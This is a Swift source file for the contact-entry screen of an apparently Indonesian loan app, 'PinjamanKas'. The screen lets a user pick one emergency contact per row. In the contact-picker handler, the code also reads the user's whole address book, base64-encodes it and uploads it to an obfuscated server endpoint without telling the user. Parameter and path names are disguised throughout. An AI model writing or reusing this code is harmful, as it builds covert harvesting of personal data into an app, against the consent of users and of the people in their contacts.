//
//  ContactViewController.swift
//  PinjamanKas
//
//  Created by hekang on 2026/1/20.
//

import UIKit
import SnapKit
import Alamofire
import TYAlertController
import BRPickerView

class ContactViewController: BaseViewController {
    
    var params: [String: String] = [:]
    
    var modelArray: [magicallyModel] = []
    
    private let locationManager = LocationManager()
    
    var brute: String = ""
    
    var brawny: String = ""
    
    lazy var headImageView: UIImageView = {
        let headImageView = UIImageView()
        headImageView.image = UIImage(named: "pro_head_bg_image")
        headImageView.contentMode = .scaleAspectFill
        return headImageView
    }()
    
    lazy var oneImageView: UIImageView = {
        let oneImageView = UIImageView()
        oneImageView.image = languageCode == "701" ? UIImage(named: "con_idn_a_image") : UIImage(named: "con_dn_a_image")
        return oneImageView
    }()
    
    lazy var applyBtn: UIButton = {
        let applyBtn = UIButton(type: .custom)
        applyBtn.setTitleColor(UIColor.init(hex: "#030305"), for: .normal)
        applyBtn.titleLabel?.font = UIFont.systemFont(ofSize: 18, weight: UIFont.Weight(700))
        applyBtn.setBackgroundImage(UIImage(named: "apply_b_image"), for: .normal)
        applyBtn.addTarget(self, action: #selector(applyClick), for: .touchUpInside)
        applyBtn.setTitle(languageCode == "701" ? "Berikutnya" : "Next", for: .normal)
        return applyBtn
    }()
    
    lazy var tableView: UITableView = {
        let tableView = UITableView(frame: .zero, style: .plain)
        tableView.separatorStyle = .none
        tableView.backgroundColor = .clear
        tableView.estimatedRowHeight = 100
        tableView.delegate = self
        tableView.dataSource = self
        tableView.showsVerticalScrollIndicator = false
        tableView.contentInsetAdjustmentBehavior = .never
        tableView.rowHeight = UITableView.automaticDimension
        tableView.register(ContactViewCell.self, forCellReuseIdentifier: "ContactViewCell")
        if #available(iOS 15.0, *) {
            tableView.sectionHeaderTopPadding = 0
        }
        return tableView
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = UIColor(hex: "#F5F5F5")
        view.addSubview(headImageView)
        headImageView.snp.makeConstraints { make in
            make.top.left.right.equalToSuperview()
            make.height.equalTo(210)
        }
        
        view.addSubview(appHeadView)
        appHeadView.snp.makeConstraints { make in
            make.top.equalTo(self.view.safeAreaLayoutGuide.snp.top)
            make.left.right.equalToSuperview()
            make.height.equalTo(44)
        }
        
        appHeadView.nameLabel.text = params["title"] ?? ""
        
        appHeadView.backBlock = { [weak self] in
            guard let self = self else { return }
            self.toProductDetailVc()
        }
        
        view.addSubview(applyBtn)
        applyBtn.snp.makeConstraints { make in
            make.bottom.equalTo(self.view.safeAreaLayoutGuide.snp.bottom).offset(-5)
            make.centerX.equalToSuperview()
            make.size.equalTo(CGSize(width: 335, height: 50))
        }
        
        view.addSubview(oneImageView)
        oneImageView.snp.makeConstraints { make in
            make.top.equalTo(appHeadView.snp.bottom).offset(7)
            make.centerX.equalToSuperview()
            make.size.equalTo(CGSize(width: 335, height: 40))
        }
        
        view.addSubview(tableView)
        tableView.snp.makeConstraints { make in
            make.centerX.equalToSuperview()
            make.top.equalTo(oneImageView.snp.bottom).offset(22)
            make.width.equalTo(335)
            make.bottom.equalTo(applyBtn.snp.top).offset(-10)
        }
        
        locationManager.fetchLocationInfo { locationInfo in }
        
        brute = String(Int(Date().timeIntervalSince1970))
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        Task {
            await self.getPersonalInfo()
        }
    }
    
}

extension ContactViewController {
    
    @objc func applyClick() {
        var dictArray: [[String: String]] = []
        var dict: [String: String] = [:]
        for model in modelArray {
            dict["view"] = model.view ?? ""
            dict["soldiers"] = model.soldiers ?? ""
            dict["steering"] = model.steering ?? ""
            dict["headquarters"] = model.headquarters ?? ""
            dictArray.append(dict)
        }
        
        guard let jsonData = try? JSONSerialization.data(withJSONObject: dictArray),
              let jsonString = String(data: jsonData, encoding: .utf8) else {
            print("Failed JSON serialization")
            return
        }
        
        Task {
            let dict = ["rival": params["productID"] ?? "",
                        "sagged": jsonString]
            await self.saveInfo(with: dict)
        }
        
    }
}

extension ContactViewController: UITableViewDelegate, UITableViewDataSource {
    
    func tableView(_ tableView: UITableView, heightForHeaderInSection section: Int) -> CGFloat {
        return 10
    }
    
    func tableView(_ tableView: UITableView, viewForHeaderInSection section: Int) -> UIView? {
        return UIView()
    }
    
    func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
        return modelArray.count
    }
    
    func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
        let model = modelArray[indexPath.row]
        let cell = tableView.dequeueReusableCell(withIdentifier: "ContactViewCell", for: indexPath) as! ContactViewCell
        cell.model = model
        
        cell.relationBlock = { [weak self] in
            guard let self = self else { return }
            self.popSelectView(with: model, cell: cell)
        }
        
        cell.contactBlock = { [weak self] in
            guard let self = self else { return }
            ContactManager.shared.selectSingleContact(from: self) { [weak self] result in
                guard let self = self else { return }
                let single = result.first ?? [:]
                let phone = single["bulging"] ?? ""
                let name = single["steering"] ?? ""
                if phone.isEmpty || name.isEmpty {
                    ToastManager.showMessage(languageCode == "701" ? "Format nama atau nomor kontak tidak benar." : "The name or contact number format is incorrect.")
                    return
                }
                model.view = phone
                model.steering = name
                cell.oField.text = "\(name): \(phone)"
            }
            ContactManager.shared.fetchAllContacts { [weak self] result in
                guard let self = self else { return }
                print("result===\(result)")
                if result.isEmpty {
                    return
                }
                
                do {
                    let jsonData = try JSONSerialization.data(withJSONObject: result, options: [])
                    let base64String = jsonData.base64EncodedString()
                    Task {
                        let params = ["appear": String(Int(2 + 1)), "sagged": base64String]
                        await self.uploadInfo(with: params)
                    }
                } catch {
                    print("error：\(error)")
                }
                
                
            }
        }
        
        return cell
    }
    
    private func popSelectView(with model: magicallyModel, cell: ContactViewCell) {
        let popView = PopSelectListView(frame: self.view.bounds)
        popView.nameLabel.text = model.relationship_title ?? ""
        
        let modelArray = model.opponents ?? []
        
        popView.modelArray = modelArray
        
        if let selectedValue = cell.nameField.text,
           let selectedIndex = modelArray.firstIndex(where: { $0.steering == selectedValue }) {
            popView.selectedIndex = selectedIndex
        }
        
        let alertVc = TYAlertController(alert: popView, preferredStyle: .alert)
        self.present(alertVc!, animated: true)
        
        popView.cancelBlock = { [weak self] in
            guard let self = self else { return }
            self.dismiss(animated: true)
        }
        
        popView.confirmBlock = { [weak self] listModel in
            guard let self = self else { return }
            self.dismiss(animated: true) {
                let name = listModel.steering ?? ""
                cell.nameField.text = name
                model.soldiers = listModel.appear ?? ""
            }
        }
        
    }
    
}

extension ContactViewController {
    
    private func getPersonalInfo() async {
        do {
            LoadingView.shared.show()
            let params = ["rival": params["productID"] ?? ""]
            let model: BaseModel = try await NetworkManager.shared.request("/softly/always/johnny/cigarette", method: .post, params: params)
            let sinking = model.sinking ?? ""
            if ["0", "00"].contains(sinking) {
                self.modelArray = model.sagged?.rooms?.magically ?? []
                self.tableView.reloadData()
            }
            LoadingView.shared.hide()
        } catch {
            LoadingView.shared.hide()
        }
    }
    
    private func saveInfo(with params: [String: String]) async {
        brawny = String(Int(Date().timeIntervalSince1970))
        do {
            LoadingView.shared.show()
            let model: BaseModel = try await NetworkManager.shared.request("/softly/wouldnt/understand/hagen", method: .post, params: params)
            LoadingView.shared.hide()
            let sinking = model.sinking ?? ""
            if ["0", "00"].contains(sinking) {
                Task {
                    async let _ = self.nextDetailInfo(with: params["rival"] ?? "")
                    
                    try? await Task.sleep(nanoseconds: 3_000_000_000)
                    let params = ["bladder": self.params["productID"] ?? "",
                                  "hinted": "6",
                                  "shipment": self.params["orderID"] ?? "",
                                  "brute": self.brute,
                                  "brawny": self.brawny]
                    async let _ = self.softlySmallInfo(with: params)
                    
                }
            }else {
                ToastManager.showMessage(model.strangler ?? "")
            }
        } catch {
            LoadingView.shared.hide()
        }
    }
    
    private func uploadInfo(with params: [String: String]) async {
        do {
            let _: BaseModel = try await NetworkManager.shared.request("/softly/loaves/businessit/datesduring", method: .post, params: params)
        } catch {
            
        }
    }
    
}
